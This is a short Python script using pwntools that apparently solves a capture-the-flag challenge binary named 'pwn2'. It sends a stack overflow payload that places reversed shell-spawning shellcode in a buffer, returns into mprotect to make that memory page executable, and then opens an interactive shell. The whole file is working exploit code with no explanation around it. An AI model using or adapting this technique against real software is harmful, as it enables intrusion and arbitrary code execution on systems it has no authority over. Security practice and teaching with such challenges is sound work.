#!/usr/bin/env python
from pwn import *

context.arch = 'i386'
context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

p = process('./pwn2')
elf = ELF('./pwn2')

sc_addr = 0x0804A080
page_addr = 0x0804A000
mprotect_plt = elf.plt['mprotect']

#gdb.attach(p, 'b *0x8048758\nc')

p.recvuntil('Please input a string:\n')
#payload = cyclic(0x500)
payload = (asm(shellcraft.sh()).ljust(0x64, 'A')[::-1]).ljust(128, 'A') + p32(mprotect_plt) + p32(sc_addr) + p32(page_addr) + p32(0x1000) + p32(7)
p.sendline(payload)

p.interactive()

